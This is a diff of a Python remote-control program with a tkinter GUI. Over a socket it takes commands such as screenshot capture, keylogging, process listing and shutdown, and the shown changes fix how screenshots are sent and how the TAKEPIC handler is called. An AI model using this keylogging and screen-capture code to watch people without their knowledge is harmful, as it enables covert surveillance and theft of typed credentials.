@@ -4,8 +4,8 @@ import tkinter as tk
 import winreg
 import time
 from io import BytesIO
-from pynput.keyboard import Key, Listener   
-import pyautogui
+from pynput.keyboard import Key, Listener  
+import pyautogui 
 
 BUFF_SIZE = 4096 
 
@@ -29,16 +29,13 @@ def largerSend(sock, data):
     sock.sendall(bytes(str(len(data))),"utf8")
     sock.sendall(data)
 
-def largerReceive(sock):
-    size = recvall(sock)
-
 def take(sock):
     img = pyautogui.screenshot() 
     fd = BytesIO()
     img.save(fd, "png")
     data = fd.getvalue()
-    print(data)
-    largerSend(sock, data)
+    #print(data)
+    sock.sendall(data)
     print(1)
     return
 
@@ -54,7 +51,6 @@ def takepic(sock):
         else:
             break
     return
-
 
 def shutdown(sock):
     try:
@@ -258,10 +254,6 @@ def keylog(sock):
                 listener.stop()
             return
 
-
-def takepic():
-    pass
-
 def process(sock):
     while (True):
         s = recvall(sock)
@@ -381,7 +373,6 @@ def buttonServer_click():
         conn, addr = s.accept()
         try:
             #print('Connected by', addr)
-            lines = []
             str = ""
             while True:
                 #time.sleep(1)
@@ -394,7 +385,7 @@ def buttonServer_click():
                 elif (str == "SHUTDOWN"):
                     shutdown(conn)
                 elif (str == "TAKEPIC"):
-                    takepic()
+                    takepic(conn)
                 elif (str == "PROCESS"):
                     process(conn)
                 elif (str == "APPLICATION"):
